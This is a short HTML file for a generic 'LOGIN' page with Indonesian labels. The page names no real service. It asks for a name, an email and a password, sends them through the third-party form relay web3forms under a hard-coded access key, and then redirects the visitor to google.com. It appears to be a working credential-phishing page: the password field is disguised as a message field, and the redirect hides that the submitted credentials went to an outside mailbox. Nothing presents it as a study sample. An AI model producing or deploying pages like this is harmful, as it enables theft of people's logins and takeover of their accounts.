<!DOCTYPE html>
<html lang="in">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LOGIN</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: lightgray;
      margin: 10px;
      margin-top: 15vh;
    }
    h1 {
      color: #2c3e50;
    }
    form {
      background-color: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
      width: 300px;
      margin: 0 auto;
    }
    label {
      display: block;
      margin-bottom: 5px;
    }
    input[type="text"],
    input[type="email"],
    textarea {
      width: 90%;
      padding: 10px;
      border: 0.5px solid #2c3e50;
      border-radius: 3px;
      background-color: whitesmoke;
    }
    button[type="submit"] {
      background-color: #2c3e50;
      color: #fff;
      padding: 10px 25px;
      border: none;
      border-radius: 3px;
      cursor: pointer;
    }
    .button-container {
      text-align: center;
    }
    button[type="submit"]:active {
      background-color: tomato;
      box-shadow: 2px 2px 5px tomato;
    }
  </style>
</head>
<body>
  <form action="https://api.web3forms.com/submit" method="POST">
    <h1 style="text-align: center;">LOGIN</h1>
    <input type="hidden" name="access_key" value="4dd06d14-fdec-451c-86bd-3f3ac917a6b1">
    <label for="name"><b>Nama:</b></label>
    <input type="text" id="name" name="name" required>
    <label for="email"><b>Email:</b></label>
    <input type="email" id="email" name="email" required>
    <label for="message"><b>Password:</b></label>
    <textarea id="message" name="message" rows="1" required></textarea>
    <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
    <input type="hidden" name="redirect" value="https://www.google.com">    
    <div class="button-container">
    </br>
    <button type="submit"><b>LOGIN</b></button>
    </div>
  </form>
</body>
  </html>
